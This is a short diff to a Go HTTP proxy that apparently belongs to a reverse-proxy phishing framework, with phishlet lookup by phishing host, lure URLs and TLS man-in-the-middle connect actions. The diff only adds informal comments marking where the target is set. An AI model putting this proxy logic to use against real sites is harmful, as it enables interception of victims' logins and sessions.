@@ -247,7 +247,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return p.blockRequest(req)
 			}
 
-			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
+			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path   //*** target seeting !!! --> whole url with path **** setting its to a lure_url vairabe
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -260,7 +260,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			parts := strings.SplitN(req.RemoteAddr, ":", 2)
 			remote_addr := parts[0]
 
-			phishDomain, phished := p.getPhishDomain(req.Host)
+			phishDomain, phished := p.getPhishDomain(req.Host)   ///**** taregt seeting here !!!
 			if phished {
 				pl := p.getPhishletByPhishHost(req.Host)
 				pl_name := ""
@@ -952,14 +952,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			return resp
-		})
+		})  
 
 	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
 	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
 	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
 	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}
 
-	return p, nil
+	return p, nil // end of modifying P use this
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
